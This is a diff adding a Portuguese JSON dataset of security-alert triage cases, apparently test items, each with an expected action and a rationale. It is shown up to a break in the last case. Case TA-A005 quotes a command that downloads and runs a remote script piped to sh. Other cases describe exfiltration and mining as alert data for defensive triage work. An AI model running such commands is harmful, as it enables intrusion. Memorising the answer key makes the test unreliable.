@@ -1,0 +1,853 @@
+{
+ "versao": "2026-10-01",
+ "autor": "fable",
+ "casos": [
+  {
+   "id": "TA-A001",
+   "alerta": {
+    "fonte": "monitoramento",
+    "titulo": "Serviço reiniciou 4 vezes em 90 min",
+    "detalhe": "O api-pedidos-hml reiniciou às 22:04, 22:31, 23:02 e 23:27. Está saudável desde 23:28.",
+    "ativo": "api-pedidos-hml",
+    "ambiente": "homolog"
+   },
+   "contexto": [
+    "O pipeline de homologação publica a cada merge na branch de integração.",
+    "4 merges registrados entre 22:00 e 23:30."
+   ],
+   "acao": "auto_close",
+   "sinais": {
+    "atividade_esperada": true,
+    "ativo_critico": false,
+    "indicio_de_comprometimento": false,
+    "em_andamento": false
+   },
+   "nota": "Um reinício por merge, em homologação; já estável."
+  },
+  {
+   "id": "TA-A002",
+   "alerta": {
+    "fonte": "monitoramento",
+    "titulo": "CPU do api-clientes em 95%",
+    "detalhe": "CPU média das réplicas em 95% desde 21:40; às 03:10 continua. Latência p95 em 3 vezes o normal.",
+    "ativo": "api-clientes",
+    "ambiente": "prod"
+   },
+   "contexto": [
+    "Deploy 2.7.1 do api-clientes às 21:35.",
+    "Nos deploys anteriores a CPU normalizou em até 10 min."
+   ],
+   "acao": "notify_owner",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": false,
+    "em_andamento": true
+   },
+   "nota": "difícil: pico após deploy — o deploy explica o começo, não cinco horas e meia de CPU alta; é regressão que o dono precisa ver."
+  },
+  {
+   "id": "TA-A003",
+   "alerta": {
+    "fonte": "waf",
+    "titulo": "Injeção de SQL com respostas de sucesso",
+    "detalhe": "01:02 a 01:17: 212 requisições com payload de SQLi contra /api/clientes/busca, origem 203.0.113.17. 209 barradas; 3 tiveram resposta 200 com 48 kB (o normal da rota é 2 kB). Origem bloqueada automaticamente às 01:18; nada depois.",
+    "ativo": "gateway-borda",
+    "ambiente": "prod"
+   },
+   "contexto": [],
+   "acao": "queue_tier2",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": true,
+    "em_andamento": false
+   },
+   "nota": "difícil: indício encerrado — três respostas grandes sugerem vazamento, mas a origem já foi bloqueada e parou; resta investigar o que saiu."
+  },
+  {
+   "id": "TA-A004",
+   "alerta": {
+    "fonte": "auth",
+    "titulo": "Cliente OAuth criado com credencial de semente",
+    "detalhe": "02:26 login no auth-svc-hml com a credencial de semente a partir de 203.0.113.61. 02:28 cliente OAuth `app-teste9` criado com escopo total. O cliente continua cadastrado.",
+    "ativo": "auth-svc-hml",
+    "ambiente": "homolog"
+   },
+   "contexto": [
+    "A base de homologação é sintética; as credenciais de semente não existem em produção."
+   ],
+   "acao": "queue_tier2",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": false,
+    "indicio_de_comprometimento": true,
+    "em_andamento": true
+   },
+   "nota": "difícil: indício em ativo não crítico — acesso externo real e artefato ainda instalado, mas em homologação sintética: fila, sem acordar ninguém."
+  },
+  {
+   "id": "TA-A005",
+   "alerta": {
+    "fonte": "edr",
+    "titulo": "Processo suspeito em contêiner",
+    "detalhe": "03:20 o contêiner api-clientes executou `curl http://198.51.100.9/a.sh | sh` e depois `chmod +x /tmp/.x`. O processo /tmp/.x está rodando e testando a porta 5432 em 10.0.0.0/24.",
+    "ativo": "worker-01",
+    "ambiente": "prod"
+   },
+   "contexto": [],
+   "acao": "contain_now",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": true,
+    "em_andamento": true
+   },
+   "nota": "Código baixado e executado em produção, já procurando o banco."
+  },
+  {
+   "id": "TA-A006",
+   "alerta": {
+    "fonte": "monitoramento",
+    "titulo": "CPU do api-pedidos em 95%",
+    "detalhe": "CPU média das 3 réplicas em 95% desde 02:10. Às 02:16 começou a cair (81%). Latência dentro do normal.",
+    "ativo": "api-pedidos",
+    "ambiente": "prod"
+   },
+   "contexto": [
+    "Deploy 4.18.0 do api-pedidos às 02:09.",
+    "Nota da versão: 'na subida, cada réplica reconstrói o cache de catálogo; uns 10 minutos de CPU alta'."
+   ],
+   "acao": "auto_close",
+   "sinais": {
+    "atividade_esperada": true,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": false,
+    "em_andamento": true
+   },
+   "nota": "difícil: pico após deploy — o efeito é o anunciado na nota da versão e ainda está dentro dos 10 minutos."
+  },
+  {
+   "id": "TA-A007",
+   "alerta": {
+    "fonte": "banco",
+    "titulo": "Primário reiniciado",
+    "detalhe": "04:42 o pg-prod-01 reiniciou. Voltou a aceitar conexões às 04:44.",
+    "ativo": "pg-prod-01",
+    "ambiente": "prod"
+   },
+   "contexto": [
+    "Janela de manutenção MUD-208: atualização de versão menor do Postgres, 01/10 das 01:00 às 03:00.",
+    "A mudança foi registrada como concluída às 02:20."
+   ],
+   "acao": "notify_owner",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": false,
+    "em_andamento": false
+   },
+   "nota": "difícil: manutenção fora da janela — havia manutenção anunciada, mas terminou às 02:20 e a janela fechou às 03:00; este reinício não é dela."
+  },
+  {
+   "id": "TA-A008",
+   "alerta": {
+    "fonte": "auth",
+    "titulo": "Viagem impossível: dois logins em países diferentes em 18 min",
+    "detalhe": "23:40 login de adm-jonas em Recife. 23:58 login de adm-jonas a partir de 203.0.113.44 (hospedagem no exterior), dispositivo nunca visto. 00:03 a sessão nova criou um token de API com escopo de administrador. Sessão ativa.",
+    "ativo": "painel-admin",
+    "ambiente": "prod"
+   },
+   "contexto": [
+    "adm-jonas não tem VPN corporativa ativa hoje.",
+    "Nenhuma viagem registrada."
+   ],
+   "acao": "contain_now",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": true,
+    "em_andamento": true
+   },
+   "nota": "Par do caso da VPN: mesmo título, sem explicação, dispositivo novo e token de administrador recém-criado."
+  },
+  {
+   "id": "TA-A009",
+   "alerta": {
+    "fonte": "monitoramento",
+    "titulo": "Nó saiu do cluster",
+    "detalhe": "02:33 o worker-04 parou de responder ao gerente. As 9 tarefas dele foram reagendadas nos outros nós. O nó continua fora.",
+    "ativo": "worker-04",
+    "ambiente": "prod"
+   },
+   "contexto": [],
+   "acao": "notify_owner",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": false,
+    "em_andamento": true
+   },
+   "nota": "Cluster com um nó a menos, sem explicação no contexto."
+  },
+  {
+   "id": "TA-A010",
+   "alerta": {
+    "fonte": "monitoramento",
+    "titulo": "Disco em 97% (6ª ocorrência em 24 h)",
+    "detalhe": "05:10 volume de dados do fila-rabbit-01 em 97%. Ocorrências anteriores: 90%, 91%, 90%, 91%, 91%.",
+    "ativo": "fila-rabbit-01",
+    "ambiente": "prod"
+   },
+   "contexto": [
+    "Chamado INFRA-502 aberto ontem às 14:10; o time de mensageria está ciente.",
+    "Expansão do volume agendada para 02/10."
+   ],
+   "acao": "notify_owner",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": false,
+    "em_andamento": true
+   },
+   "nota": "difícil: alerta repetido — o chamado cobria 90–91%; saltar para 97% em duas horas é escalada, não repetição. O dono precisa saber antes de amanhã."
+  },
+  {
+   "id": "TA-A011",
+   "alerta": {
+    "fonte": "waf",
+    "titulo": "Varredura de caminhos administrativos",
+    "detalhe": "02:50 a 03:00: 1.900 requisições para /wp-admin, /.env, /phpmyadmin e semelhantes, de 14 endereços externos. Todas com resposta 403 ou 404. Continua.",
+    "ativo": "gateway-borda",
+    "ambiente": "prod"
+   },
+   "contexto": [],
+   "acao": "notify_owner",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": false,
+    "em_andamento": true
+   },
+   "nota": "difícil: tentativa barrada — varredura automática, nada passou; não é indício. Sem linha de base no contexto, o dono é avisado."
+  },
+  {
+   "id": "TA-A012",
+   "alerta": {
+    "fonte": "edr",
+    "titulo": "Processo com 100% de CPU e conexão a porta de mineração",
+    "detalhe": "01:58 processo `xmr-helper` iniciado em /tmp pelo usuário do contêiner ci-runner, 100% de CPU em 8 núcleos, conectado a 203.0.113.120 porta 3333. Rodando.",
+    "ativo": "worker-dev-01",
+    "ambiente": "dev"
+   },
+   "contexto": [
+    "Deploy do api-relatorios em dev às 01:50.",
+    "worker-dev-01 roda só serviços de desenvolvimento com base sintética."
+   ],
+   "acao": "queue_tier2",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": false,
+    "indicio_de_comprometimento": true,
+    "em_andamento": true
+   },
+   "nota": "difícil: pico após deploy — o deploy explicaria CPU alta, não um minerador em /tmp; como é dev sem dado de produção, vai para a fila e não acorda ninguém."
+  },
+  {
+   "id": "TA-A013",
+   "alerta": {
+    "fonte": "banco",
+    "titulo": "Primário indisponível",
+    "detalhe": "03:02 o pg-prod-01 parou de aceitar conexões. O registro do sistema mostra o processo encerrado por falta de memória. A promoção automática da réplica não ocorreu. Continua fora.",
+    "ativo": "pg-prod-01",
+    "ambiente": "prod"
+   },
+   "contexto": [],
+   "acao": "notify_owner",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": false,
+    "em_andamento": true
+   },
+   "nota": "difícil: operacional grave — é o pior alerta da noite, mas não há ataque nem o que conter; a ação é acordar o dono (a urgência sai de ativo crítico + em andamento)."
+  },
+  {
+   "id": "TA-A014",
+   "alerta": {
+    "fonte": "banco",
+    "titulo": "Leitura volumosa e contínua de tabela de pedidos",
+    "detalhe": "Papel svc-bi lendo `pedidos` em lotes de 50 mil linhas desde 01:02, a partir de 10.0.0.35. 3 h de duração até agora. Continua.",
+    "ativo": "pg-prod-02",
+    "ambiente": "prod"
+   },
+   "contexto": [
+    "Carga noturna do BI: svc-bi lê pedidos da réplica entre 01:00 e 05:00, todo dia, a partir de 10.0.0.35 (tarefa carga-bi).",
+    "Volume desta noite: 1,1 vez a média dos últimos 30 dias."
+   ],
+   "acao": "auto_close",
+   "sinais": {
+    "atividade_esperada": true,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": false,
+    "em_andamento": true
+   },
+   "nota": "difícil: exfiltração lenta — parece dado saindo aos poucos, mas é a carga do BI: conta, origem, horário e volume de sempre."
+  },
+  {
+   "id": "TA-A015",
+   "alerta": {
+    "fonte": "banco",
+    "titulo": "Conexões externas autenticadas em banco de desenvolvimento",
+    "detalhe": "02:44 a 02:59: 3 sessões autenticadas no pg-dev-01 a partir de 198.51.100.61 executando `COPY clientes TO STDOUT`. Uma sessão ainda aberta.",
+    "ativo": "pg-dev-01",
+    "ambiente": "dev"
+   },
+   "contexto": [
+    "pg-dev-01 guarda cópia integral de produção desde 28/09 (chamado DEV-431, reprodução de erro).",
+    "Regra de firewall aberta ontem às 18:20 por m.tavares para teste de integração com parceiro.",
+    "O endereço do parceiro registrado no chamado é outro (203.0.113.9)."
+   ],
+   "acao": "contain_now",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": true,
+    "em_andamento": true
+   },
+   "nota": "difícil: dado de produção fora de produção — o ambiente é dev, mas a base é cópia de produção; quem está copiando não é o parceiro."
+  },
+  {
+   "id": "TA-A016",
+   "alerta": {
+    "fonte": "auth",
+    "titulo": "Viagem impossível: dois logins em países diferentes em 18 min",
+    "detalhe": "02:51 login de r.koga em São Paulo (rede residencial). 03:09 novo login de r.koga a partir de Frankfurt. Segundo fator aprovado nos dois. Sessão ativa.",
+    "ativo": "painel-admin",
+    "ambiente": "prod"
+   },
+   "contexto": [
+    "O endereço de Frankfurt é o nó de saída 4 da VPN corporativa (lista de saídas conhecidas).",
+    "O cliente de VPN de r.koga registrou conexão às 03:08.",
+    "Mesmo dispositivo registrado nos dois logins."
+   ],
+   "acao": "auto_close",
+   "sinais": {
+    "atividade_esperada": true,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": false,
+    "em_andamento": true
+   },
+   "nota": "difícil: login impossível — o segundo país é a saída da VPN da casa, ligada um minuto antes, no mesmo dispositivo; nada a investigar."
+  },
+  {
+   "id": "TA-A017",
+   "alerta": {
+    "fonte": "auth",
+    "titulo": "Rajada de falhas de login",
+    "detalhe": "00:50 a 01:40: 900 falhas de login na wiki-interna em 12 contas, a partir de 5 endereços externos. Nenhum sucesso. As tentativas pararam à 01:40.",
+    "ativo": "wiki-interna",
+    "ambiente": "prod"
+   },
+   "contexto": [
+    "wiki-interna: documentação de integração de novos funcionários; sem dado de cliente nem segredo."
+   ],
+   "acao": "notify_owner",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": false,
+    "indicio_de_comprometimento": false,
+    "em_andamento": false
+   },
+   "nota": "difícil: tentativa barrada — nenhuma conta cedeu e o ataque parou: sem indício, em ativo não crítico; vira aviso para a manhã."
+  },
+  {
+   "id": "TA-A018",
+   "alerta": {
+    "fonte": "auth",
+    "titulo": "Conta de administrador recuperada e usada de fora",
+    "detalhe": "02:15 senha de wiki-admin redefinida pelo fluxo de recuperação. 02:17 login a partir de 203.0.113.80. 02:20 novo usuário administrador `suporte-ti2` criado. Sessão ativa.",
+    "ativo": "wiki-interna",
+    "ambiente": "prod"
+   },
+   "contexto": [
+    "wiki-interna: documentação de integração de novos funcionários; sem dado de cliente; a varredura semanal não achou segredo."
+   ],
+   "acao": "queue_tier2",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": false,
+    "indicio_de_comprometimento": true,
+    "em_andamento": true
+   },
+   "nota": "difícil: indício em ativo não crítico — tomada de conta em andamento, mas numa wiki sem dado nem credencial: analista de manhã, sem acordar o plantão."
+  },
+  {
+   "id": "TA-A019",
+   "alerta": {
+    "fonte": "monitoramento",
+    "titulo": "Taxa de erro 5xx em 14%",
+    "detalhe": "O api-pagamentos responde 5xx em 14% das chamadas desde 02:30. Continua às 03:05.",
+    "ativo": "api-pagamentos",
+    "ambiente": "prod"
+   },
+   "contexto": [
+    "Deploy do api-pedidos 4.18.0 às 02:09.",
+    "O api-pagamentos está sem deploy há 9 dias."
+   ],
+   "acao": "notify_owner",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": false,
+    "em_andamento": true
+   },
+   "nota": "difícil: contexto não cobre — houve deploy, mas em outro serviço; erro em pagamentos não é 'efeito esperado' de nada."
+  },
+  {
+   "id": "TA-A020",
+   "alerta": {
+    "fonte": "monitoramento",
+    "titulo": "Disco em 95%",
+    "detalhe": "23:10 o volume de imagens do worker-dev-01 chegou a 95%. Dois builds falharam por falta de espaço à 23:12.",
+    "ativo": "worker-dev-01",
+    "ambiente": "dev"
+   },
+   "contexto": [],
+   "acao": "notify_owner",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": false,
+    "indicio_de_comprometimento": false,
+    "em_andamento": true
+   },
+   "nota": "Capacidade em dev, já quebrando build; sem contexto."
+  },
+  {
+   "id": "TA-A021",
+   "alerta": {
+    "fonte": "fila",
+    "titulo": "Fila acumulando: relatorios.gerar com 12 mil mensagens",
+    "detalhe": "00:04 a fila relatorios.gerar passou de 200 para 12.300 mensagens. 4 consumidores ativos, consumo de 220 mensagens por minuto.",
+    "ativo": "fila-rabbit-01",
+    "ambiente": "prod"
+   },
+   "contexto": [
+    "Fechamento mensal: lote de relatórios disparado à 00:00 de todo dia 1º (tarefa fechamento-mensal).",
+    "Mesmo pico e mesmo ritmo de consumo no dia 1º do mês passado."
+   ],
+   "acao": "auto_close",
+   "sinais": {
+    "atividade_esperada": true,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": false,
+    "em_andamento": true
+   },
+   "nota": "Lote mensal conhecido, consumo normal."
+  },
+  {
+   "id": "TA-A022",
+   "alerta": {
+    "fonte": "waf",
+    "titulo": "Payloads de ataque em homologação",
+    "detalhe": "07:40 a 07:55: 420 requisições com payloads de SQLi e de travessia de diretório contra o gateway-hml, origem 10.0.0.77. 5 respostas 200 em /admin. Continua.",
+    "ativo": "gateway-hml",
+    "ambiente": "homolog"
+   },
+   "contexto": [
+    "Teste de intrusão contratado (chamado SEG-88): escopo -hml, origem 10.0.0.77.",
+    "Janela do teste: 30/09 22:00 a 01/10 06:00.",
+    "A base de homologação é sintética."
+   ],
+   "acao": "queue_tier2",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": false,
+    "indicio_de_comprometimento": true,
+    "em_andamento": true
+   },
+   "nota": "difícil: teste de intrusão — alvo e origem batem, mas a janela acabou às 06:00; fora da janela não é mais o teste autorizado. Ativo não crítico: fila."
+  },
+  {
+   "id": "TA-A023",
+   "alerta": {
+    "fonte": "banco",
+    "titulo": "Consulta volumosa por usuário humano",
+    "detalhe": "23:05 a.prado executou `SELECT * FROM clientes` (1,2 milhão de linhas, inclui a coluna cpf) no pg-prod-02 a partir de 10.0.0.58. Terminou às 23:09.",
+    "ativo": "pg-prod-02",
+    "ambiente": "prod"
+   },
+   "contexto": [
+    "a.prado é analista de dados com permissão de leitura; costuma consultar agregados de pedidos.",
+    "É a primeira leitura integral de clientes pela conta. Sem chamado associado."
+   ],
+   "acao": "queue_tier2",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": null,
+    "em_andamento": false
+   },
+   "nota": "difícil: usuário legítimo, ação incomum — indício `null`: a permissão existe e a ação é inédita; pode ser análise nova ou coleta indevida. Fila."
+  },
+  {
+   "id": "TA-A024",
+   "alerta": {
+    "fonte": "edr",
+    "titulo": "Varredura de portas na rede de servidores",
+    "detalhe": "02:03 a 02:40: 10.0.0.30 testou as portas 22, 443, 5432 e 5672 em 61 endereços da rede 10.0.0.0/24. Continua.",
+    "ativo": "rede de servidores de produção",
+    "ambiente": "prod"
+   },
+   "contexto": [
+    "10.0.0.30 é o scanner de vulnerabilidades da casa.",
+    "Varredura semanal: toda quinta-feira, das 02:00 às 04:00."
+   ],
+   "acao": "auto_close",
+   "sinais": {
+    "atividade_esperada": true,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": false,
+    "em_andamento": true
+   },
+   "nota": "difícil: título engana — varredura interna é sinal clássico de movimento lateral, mas origem, dia e hora são os do scanner da casa."
+  },
+  {
+   "id": "TA-A025",
+   "alerta": {
+    "fonte": "edr",
+    "titulo": "CRÍTICO: ferramenta de administração remota executada no gerente do cluster",
+    "detalhe": "02:09 sessão SSH da conta svc-deploy a partir de 10.0.0.12 executou `docker service update --image` em 3 serviços. Sessão ainda aberta.",
+    "ativo": "swarm-manager-01",
+    "ambiente": "prod"
+   },
+   "contexto": [
+    "Deploy do api-pedidos 4.18.0 em andamento (pipeline 7731, início 02:09).",
+    "svc-deploy é a conta do pipeline; 10.0.0.12 é o executor de deploy."
+   ],
+   "acao": "auto_close",
+   "sinais": {
+    "atividade_esperada": true,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": false,
+    "em_andamento": true
+   },
+   "nota": "difícil: título engana — a EDR grita 'crítico', mas é o pipeline de deploy fazendo o que sempre faz, da origem de sempre."
+  },
+  {
+   "id": "TA-A026",
+   "alerta": {
+    "fonte": "fila",
+    "titulo": "Fila de e-mails transacionais sem consumidor",
+    "detalhe": "A fila emails.saida tem 48 mil mensagens (o normal é menos de 500). Consumidores: 0 desde 02:20.",
+    "ativo": "fila-rabbit-01",
+    "ambiente": "prod"
+   },
+   "contexto": [],
+   "acao": "notify_owner",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": false,
+    "em_andamento": true
+   },
+   "nota": "Consumidor caiu e ninguém sabe; sem sinal de ataque."
+  },
+  {
+   "id": "TA-A027",
+   "alerta": {
+    "fonte": "monitoramento",
+    "titulo": "Uso de disco acima de 80%",
+    "detalhe": "worker-03: /tmp cresceu 14 GB em 40 min com arquivos `cl_*.tar.gz` criados pelo usuário do contêiner api-clientes. Ao mesmo tempo, envio contínuo de 2 MB/s para 198.51.100.23. Continua.",
+    "ativo": "worker-03",
+    "ambiente": "prod"
+   },
+   "contexto": [],
+   "acao": "contain_now",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": true,
+    "em_andamento": true
+   },
+   "nota": "difícil: título engana — o título é de capacidade; o detalhe é dado sendo empacotado e enviado para fora."
+  },
+  {
+   "id": "TA-A028",
+   "alerta": {
+    "fonte": "monitoramento",
+    "titulo": "Disco em 91% (5ª ocorrência em 24 h)",
+    "detalhe": "03:05 volume de dados do fila-rabbit-01 em 91%. Ocorrências anteriores nas últimas 24 h: 90%, 91%, 90%, 91%.",
+    "ativo": "fila-rabbit-01",
+    "ambiente": "prod"
+   },
+   "contexto": [
+    "Chamado INFRA-502 aberto ontem às 14:10; o time de mensageria está ciente.",
+    "Expansão do volume agendada para 02/10."
+   ],
+   "acao": "auto_close",
+   "sinais": {
+    "atividade_esperada": true,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": false,
+    "em_andamento": true
+   },
+   "nota": "difícil: alerta repetido — mesmo valor, chamado aberto, dono ciente, correção agendada: repetir o aviso não acrescenta nada."
+  },
+  {
+   "id": "TA-A029",
+   "alerta": {
+    "fonte": "waf",
+    "titulo": "Rajada de payloads de injeção de SQL e XSS",
+    "detalhe": "02:30 a 02:41: 1.340 requisições com payloads de SQLi e XSS contra /api/pedidos e /login, origem 10.0.0.77. 1.338 barradas, 2 com resposta 500. Continua.",
+    "ativo": "gateway-hml",
+    "ambiente": "homolog"
+   },
+   "contexto": [
+    "Teste de intrusão contratado (chamado SEG-88): escopo = todos os serviços com sufixo -hml.",
+    "Origem registrada do teste: 10.0.0.77. Janela: 30/09 22:00 a 01/10 06:00."
+   ],
+   "acao": "auto_close",
+   "sinais": {
+    "atividade_esperada": true,
+    "ativo_critico": false,
+    "indicio_de_comprometimento": false,
+    "em_andamento": true
+   },
+   "nota": "difícil: teste de intrusão — alvo no escopo, hora na janela e origem registrada: as três batem, é o teste."
+  },
+  {
+   "id": "TA-A030",
+   "alerta": {
+    "fonte": "backup",
+    "titulo": "Backup concluído com tamanho anômalo",
+    "detalhe": "Backup completo do pg-prod-01 terminou às 01:41 com código de saída 0 e 0,3 MB. A média dos últimos 30 dias é 42 GB.",
+    "ativo": "backup-prod",
+    "ambiente": "prod"
+   },
+   "contexto": [],
+   "acao": "notify_owner",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": false,
+    "em_andamento": false
+   },
+   "nota": "difícil: backup — 'concluído' com 0,3 MB é falha silenciosa, não sucesso; também não é ataque."
+  },
+  {
+   "id": "TA-A031",
+   "alerta": {
+    "fonte": "auth",
+    "titulo": "Sucesso de login após rajada de falhas (4º alerta da noite)",
+    "detalhe": "Conta fin-lucia: 600 falhas de 40 endereços entre 01:30 e 02:46; 02:47 login com sucesso a partir de 203.0.113.71. 02:48 a regra de anomalia travou a conta e derrubou a sessão.",
+    "ativo": "auth-svc",
+    "ambiente": "prod"
+   },
+   "contexto": [
+    "Os 3 alertas anteriores da noite foram só de falhas, sem sucesso."
+   ],
+   "acao": "queue_tier2",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": true,
+    "em_andamento": false
+   },
+   "nota": "difícil: alerta repetido — os três primeiros eram tentativa barrada; este tem um sucesso, então é outro alerta. A conta já foi travada: fila."
+  },
+  {
+   "id": "TA-A032",
+   "alerta": {
+    "fonte": "banco",
+    "titulo": "Réplica fora de sincronia",
+    "detalhe": "01:40 atraso de replicação do pg-prod-02 em 9 min e subindo. Replicação pausada.",
+    "ativo": "pg-prod-02",
+    "ambiente": "prod"
+   },
+   "contexto": [
+    "Janela de manutenção MUD-208: atualização de versão menor do Postgres de produção, 01/10 das 01:00 às 03:00.",
+    "Passo 3 do plano: a réplica fica pausada durante a troca do primário."
+   ],
+   "acao": "auto_close",
+   "sinais": {
+    "atividade_esperada": true,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": false,
+    "em_andamento": true
+   },
+   "nota": "Dentro da janela e previsto no plano."
+  },
+  {
+   "id": "TA-A033",
+   "alerta": {
+    "fonte": "banco",
+    "titulo": "Padrão de leitura incomum em tabela de clientes",
+    "detalhe": "Papel svc-relatorios executa `SELECT * FROM clientes` em lotes de 500 linhas a cada 4 min desde 22:10, a partir de 10.0.0.93. 41 mil linhas lidas até 03:00. Continua.",
+    "ativo": "pg-prod-01",
+    "ambiente": "prod"
+   },
+   "contexto": [
+    "svc-relatorios costuma consultar só agregados, entre 06:00 e 07:00, a partir de 10.0.0.31.",
+    "10.0.0.93 não consta no inventário."
+   ],
+   "acao": "contain_now",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": true,
+    "em_andamento": true
+   },
+   "nota": "difícil: exfiltração lenta — volume pequeno por vez, nenhum limiar de tráfego dispara; conta fora do horário, origem fora do inventário, e continua."
+  },
+  {
+   "id": "TA-A034",
+   "alerta": {
+    "fonte": "auth",
+    "titulo": "Login de conta de serviço fora do horário comercial",
+    "detalhe": "01:00 login de svc-backup no pg-prod-01 a partir de 10.0.0.20. Sessão ativa.",
+    "ativo": "pg-prod-01",
+    "ambiente": "prod"
+   },
+   "contexto": [
+    "Backup lógico diário: svc-backup conecta a partir de 10.0.0.20 à 01:00 (agendador)."
+   ],
+   "acao": "auto_close",
+   "sinais": {
+    "atividade_esperada": true,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": false,
+    "em_andamento": true
+   },
+   "nota": "Tarefa agendada, conta e origem de sempre."
+  },
+  {
+   "id": "TA-A035",
+   "alerta": {
+    "fonte": "backup",
+    "titulo": "Backup completo demorou 2,4 vezes o normal",
+    "detalhe": "Backup completo do pg-prod-01 terminou às 04:52 (duração 3 h 50 min; média 1 h 35 min). Código de saída 0. Verificação de integridade concluída sem erro.",
+    "ativo": "backup-prod",
+    "ambiente": "prod"
+   },
+   "contexto": [
+    "Mudança MUD-207 de ontem: 180 GB de anexos migrados para o banco.",
+    "Aviso do dono no canal: 'o completo de hoje vai demorar bem mais, é esperado'."
+   ],
+   "acao": "auto_close",
+   "sinais": {
+    "atividade_esperada": true,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": false,
+    "em_andamento": false
+   },
+   "nota": "Demora avisada pelo dono, backup íntegro."
+  },
+  {
+   "id": "TA-A036",
+   "alerta": {
+    "fonte": "edr",
+    "titulo": "Executável desconhecido encerrado após 11 min",
+    "detalhe": "00:31 `atualizador.bin` executado a partir da pasta de downloads na sessão de p.sales. Criou tarefa agendada e abriu conexão para 203.0.113.140. 00:42 a EDR matou o processo e removeu a tarefa.",
+    "ativo": "dev-box-01",
+    "ambiente": "dev"
+   },
+   "contexto": [
+    "dev-box-01 não tem acesso à rede de produção nem cópia de dados de produção."
+   ],
+   "acao": "queue_tier2",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": false,
+    "indicio_de_comprometimento": true,
+    "em_andamento": false
+   },
+   "nota": "Rodou e tentou persistir antes de ser morto; máquina de dev sem dado de produção."
+  },
+  {
+   "id": "TA-A037",
+   "alerta": {
+    "fonte": "monitoramento",
+    "titulo": "Certificado expira em 6 dias",
+    "detalhe": "O certificado do gateway-borda expira em 07/10. A renovação automática falhou 3 vezes (erro no desafio de DNS).",
+    "ativo": "gateway-borda",
+    "ambiente": "prod"
+   },
+   "contexto": [],
+   "acao": "notify_owner",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": false,
+    "em_andamento": true
+   },
+   "nota": "Pendência do dono, com prazo."
+  },
+  {
+   "id": "TA-A038",
+   "alerta": {
+    "fonte": "auth",
+    "titulo": "Login fora do horário habitual",
+    "detalhe": "03:20 login de c.moura (financeiro) no painel do api-pagamentos. Mesma cidade e mesmo provedor de sempre; dispositivo novo. Segundo fator aprovado. Sessão ativa, sem exportação até agora.",
+    "ativo": "api-pagamentos",
+    "ambiente": "prod"
+   },
+   "contexto": [
+    "c.moura nunca acessou entre 22:00 e 07:00 nos últimos 90 dias.",
+    "O fechamento contábil do trimestre é hoje."
+   ],
+   "acao": "queue_tier2",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": null,
+    "em_andamento": true
+   },
+   "nota": "difícil: sinal indecidível — indício `null`: pode ser a própria c.moura adiantando o fechamento num aparelho novo, ou conta tomada; nada no texto desempata. Dúvida vai para a fila."
+  },
+  {
+   "id": "TA-A039",
+   "alerta": {
+    "fonte": "banco",
+    "titulo": "Exportação de tabela por conta fora do chamado",
+    "detalhe": "30/09 19:12 a conta estagio-02 executou `COPY clientes TO STDOUT` no pg-dev-01 (310 mil linhas) a partir de 10.0.0.64. Sessão encerrada às 19:15. Detectado pelo relatório noturno.",
+    "ativo": "pg-dev-01",
+    "ambiente": "dev"
+   },
+   "contexto": [
+    "pg-dev-01 guarda cópia integral de produção desde 28/09 (chamado DEV-431).",
+    "estagio-02 não participa do chamado DEV-431."
+   ],
+   "acao": "queue_tier2",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": true,
+    "em_andamento": false
+   },
+   "nota": "difícil: dado de produção fora de produção — base de dev com cópia de produção é ativo crítico; a exportação já terminou, então é investigação, não contenção."
+  },
+  {
+   "id": "TA-A040",
+   "alerta": {
+    "fonte": "backup",
+    "titulo": "Exclusão em massa de cópias de segurança",
